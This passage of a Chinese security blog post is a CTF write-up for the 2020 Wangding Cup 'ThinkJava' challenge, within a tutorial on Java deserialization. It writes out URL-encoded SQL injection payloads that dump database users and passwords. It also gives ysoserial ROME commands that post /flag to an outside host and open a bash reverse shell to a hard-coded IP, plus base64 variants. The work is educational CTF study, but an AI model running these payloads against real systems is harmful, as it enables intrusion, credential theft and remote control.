<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211205637136.png" alt="image-20231211205637136"></p>
<p>这里看师傅们说这里由于进行了dbName的拼接，那我们在进行sql注入的时候要满足jdbc协议的连接不能出错，因此这里会用到类似url的锚点（这里做完在了解什么是锚点）</p>
<h3 id="jdbc-sql-注入">jdbc sql 注入</h3>
<p>关于#的使用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211205809919.png" alt="image-20231211205809919"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211210020786.png" alt="image-20231211210020786"></p>
<p>在url中#表示锚点，表示网页中的一个位置，比如http:xxx/index.html#aaa，浏览器读取这个url，会将aaa移到可视位置。在第一个#，都会被视为位置标识符，不会被发送到服务端</p>
<p>而jdbc类似于url解析，所以会忽略#后面的字符</p>
<p>而#又是sql注入中的注释符，如果我们需要在url中传#，那么需要进行url编码为%23</p>
<p>查看数据库，这里是get传参，这里测试了几波发现需要将单引号，#和空格进行url编码</p>
<pre><code class="hljs http">?dbName=myapp%23%27%20union%20select%20group_concat(SCHEMA_NAME)from(information_schema.schemata)%23</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211211238027.png" alt="image-20231211211238027"></p>
<p>爆表名<code>dbName=myapp%23%27%20union%20select%20group_concat(table_name)from(information_schema.tables)where(table_schema%3D%27myapp%27)%23</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211211806487.png" alt="image-20231211211806487"></p>
<p>爆字段名：</p>
<pre><code class="hljs http">dbName=myapp%23%27%20union%20select%20group_concat(column_name)from(information_schema.columns)where((table_schema%3D%27myapp%27)and(table_name%3D%27user%27))%23</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211212132684.png" alt="image-20231211212132684"></p>
<p>爆用户名密码：</p>
<pre><code class="hljs http">dbName=myapp%23%27%20union%20select%20group_concat(name,0x3a,pwd)from%20user%23</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211212335395.png" alt="image-20231211212335395"></p>
<p>这样的话就拿到了用户账号和密码，使用账号密码登录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211212435705.png" alt="image-20231211212435705"></p>
<p>如上图，登陆成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211212455588.png" alt="image-20231211212455588"></p>
<p>往下翻可以看到这里的body部分存在r00ab开头的，这很明显就是Java反序列化1经过base64编码后的结果，那我们验证一下这里是否存在Java反序列化1漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211213618706.png" alt="image-20231211213618706"></p>
<p>如上图，我们使用的是bp自带的插件，如上图，我们发现确实存在反序列化漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211213643699.png" alt="image-20231211213643699"></p>
<p>接下来使用ysoserial打</p>
<h3 id="ysoserial">ysoserial</h3>
<pre><code class="hljs java">java -jar ysoserial-all.jar ROME <span class="hljs-string">"curl http://ip:5555 -d @/flag"</span> &gt; <span class="hljs-number">1.</span>bin
    
    bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">124.220</span><span class="hljs-number">.233</span><span class="hljs-number">.26</span>/<span class="hljs-number">5555</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>
java -jar ysoserial-all.jar ROME <span class="hljs-string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"</span> &gt; <span class="hljs-number">1.</span>bin</code></pre>
<p>上述命令打完记得base64编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231211222006697.png" alt="image-20231211222006697"></p>
<p>本来我们分析道Authorization会将用户的token信息进行Java序列化并编码，那我们就可以构造而已的Java序列化数据传给Authorization，这样在解析的时候就会反序列化我们的恶意数据，进而拿到shell等。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212170727503.png" alt="image-20231212170727503"></p>
<p>这里问了一下GPT上述payload的含义：</p>
<pre><code class="hljs plaintext">这段命令使用`curl`工具进行HTTP请求，并包含了一些参数和选项。让我们逐步解释这个命令：

1. `curl`: 是一个命令行工具，用于在Unix和类Unix系统中传输数据，支持多种协议，包括HTTP。

2. `http://xxx`: 指定了要访问的URL，其中`xxx`是占位符。你需要替换它为实际的目标URL。

3. `-d`: 这是`curl`的一个选项，用于指定要发送的数据。在这个例子中，`-d @/flag`表示将`/flag`文件中的数据作为POST请求的主体数据发送到指定的URL。`@`符号告诉`curl`从文件中读取数据。

总的来说，这个命令的目的是通过HTTP POST请求将`/flag`文件的内容发送到指定的URL（替换为实际的目标URL）。在实际应用中，请确保你了解并授权了发送数据的操作，以免不当使用。</code></pre>
<p>接着尝试一下反弹shell，命令如下：</p>
<pre><code class="hljs java">bash -i &gt;&amp; /dev/tcp/ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> --进行base64编码
java -jar ysoserial-all.jar ROME <span class="hljs-string">"bash -c {echo,编码内容}|{base64,-d}|{bash,-i}"</span> &gt; <span class="hljs-number">1.</span>bin  --进行base64编码</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212172031595.png" alt="image-20231212172031595"></p>
<p>接着发送至current接口即可，如下图成功拿到shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212171900336.png" alt="image-20231212171900336"></p>
<p>这里我们用ysoserial对用户登录成功的数据分析一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212172138052.png" alt="image-20231212172138052"></p>
<pre><code class="hljs plaintext">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</code></pre>
<p>不过在此之前需要将上述转为16进制，这里依旧用个python脚本</p>
<pre><code class="hljs python2">import base64
a = "rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu"
b = base64.b64decode(a).encode('hex')
print(b)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212172546542.png" alt="image-20231212172546542"></p>
<p>我们进入文件会发现如下图，name中含有admin，说明这里代码通过反序列化Java数据来判断其中name的值是否为admin</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231212172611409.png" alt="image-20231212172611409"></p>
<h1 id="0x09-参考文章">0x09 参考文章</h1>
<p>Java反序列化1：</p>
<p><a target="_blank" rel="noopener" href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/index.html">Java 反序列化漏洞入门</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/351516.html">Java反序列化1从入门到放弃</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4711#toc-2">浅显易懂的Java反序列化1入门</a></p>
<p>Java反射：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VGKDEWqgrDYLo6-zQumxAA">JAVA反射学习</a></p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2022/10/09/%E5%88%9D%E6%8E%A2java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%B0%84-2/#getConstructor%E5%92%8CgetDeclaredConstructor">初探java安全之反射(2)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12283?time__1311=mqmhD5YIxIoxkDlxGoIDyQ5wE%2BxAO4AKKx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">Java反射</a></p>
<p>webgoat：</p>
<p><a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/4365.html">0基础学渗透-WebGoat靶场（五）</a></p>
<p><a target="_blank" rel="noopener" href="https://ce-automne.github.io/2020/01/28/WebGoat8.0-Insecure-Deserialization%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/">WebGoat8.0 Insecure Deserialization</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seanyang_/article/details/134251176?spm=1001.2014.3001.5502">webgoat-Insecure Deserialization不安全的序列化</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BlogVice-2203/p/17037439.html">WebGoat-8.2.2靶场之不安全的反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/df6eee0c.html">Swagger未授权访问漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124003575?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170229735816800225566502%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170229735816800225566502&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124003575-null-null.142%5Ev96%5Epc_search_result_base8&amp;utm_term=%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DThink%20Java&amp;spm=1018.2226.3001.4187">[网鼎杯 2020 朱雀组]Think Java</a> -1</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12914439.html">[网鼎杯 2020 朱雀组]Think Java</a> -2</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51953382/article/details/131833995?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170237242016800222811261%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170237242016800222811261&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-131833995-null-null.142%5Ev96%5Epc_search_result_base8&amp;utm_term=%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DThink%20Java&amp;spm=1018.2226.3001.4187">CTFHUB-think_java(2020-网鼎杯-朱雀组-Web-think_java)</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/')">Java反序列化1入门</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Java反序列化1入门&amp;url=http://hybcx.xyz/2023/12/09/java-fan-xu-lie-hua-1/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Java反序列化<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/22/qian-xi-dui-zhan-ping-heng/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">堆栈平衡的学习</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/12/ctfhub-xi-lie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTFHub系列</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/03/18/java-fan-xu-lie-hua-zhi-cc1-lian/" title="Java反序列化入门之CC1链分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-18</div><div class="title">Java反序列化入门之CC1链分析</div></div></a></div><div><a href="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/" title="Java反序列化入门之S2-001分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-04-15</div><div class="title">Java反序列化入门之S2-001分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-java%E5%8F%8D%E5%B0%84"><span class="toc-number">2.</span> <span class="toc-text">0x02 Java反射</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E6%AD%A3%E5%B0%84"><span class="toc-number">2.1.</span> <span class="toc-text">Java正射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.</span> <span class="toc-text">Java反射机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java-%E5%8F%8D%E5%B0%84%E7%BB%84%E6%88%90%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB"><span class="toc-number">2.3.</span> <span class="toc-text">Java 反射组成相关的类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96class%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.4.</span> <span class="toc-text">获取Class对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">反射常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.6.</span> <span class="toc-text">通过反射创建类对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#newinstance"><span class="toc-number">2.6.1.</span> <span class="toc-text">newInstance()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getmethod"><span class="toc-number">2.6.2.</span> <span class="toc-text">getMethod()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">2.6.3.</span> <span class="toc-text">Invoke()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84javalangruntime"><span class="toc-number">2.7.</span> <span class="toc-text">反射java.lang.Runtime</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8F%8D%E5%B0%84%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.8.</span> <span class="toc-text">Java反射到命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-1"><span class="toc-number">2.8.1.</span> <span class="toc-text">Demo 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-2"><span class="toc-number">2.8.2.</span> <span class="toc-text">Demo 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getmethod"><span class="toc-number">2.8.2.1.</span> <span class="toc-text">getMethod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getdeclaredconstructor"><span class="toc-number">2.8.2.2.</span> <span class="toc-text">getDeclaredConstructor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getconstructor%E5%92%8Cgetdeclaredconstructor"><span class="toc-number">2.9.</span> <span class="toc-text">getConstructor和getDeclaredConstructor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E7%B1%BB%E6%96%B9%E6%B3%95"><span class="toc-number">2.10.</span> <span class="toc-text">反射调用类方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F"><span class="toc-number">2.11.</span> <span class="toc-text">反射调用成员变量</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%BB%80%E4%B9%88%E6%98%AFjava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">0x02 什么是Java序列化与反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E5%8F%AF%E8%83%BD%E7%9A%84%E5%BD%A2%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 可能的形式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 JAVA原生反序列化漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="toc-number">5.</span> <span class="toc-text">0x04 Java反序列化基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E5%A6%82%E4%BD%95%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 如何序列化类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E5%A6%82%E4%BD%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 如何反序列化类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-serialversionuid"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 serialVersionUID</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%E5%AE%9E%E8%B7%B5"><span class="toc-number">6.</span> <span class="toc-text">0x08 Java反序列化1实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#81-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">6.1.</span> <span class="toc-text">8.1 序列化和反序列化过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82-ysoserial%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">8.2 ysoserial工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webgoat-insecure-deserialization"><span class="toc-number">6.2.1.</span> <span class="toc-text">webgoat-Insecure Deserialization</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#83-serializationdumper-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="toc-number">6.3.</span> <span class="toc-text">8.3 SerializationDumper 数据分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#84-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84thinkjava"><span class="toc-number">6.4.</span> <span class="toc-text">8.4 [网鼎杯 2020 朱雀组]ThinkJava</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbc-sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.4.1.</span> <span class="toc-text">jdbc sql 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial"><span class="toc-number">6.4.2.</span> <span 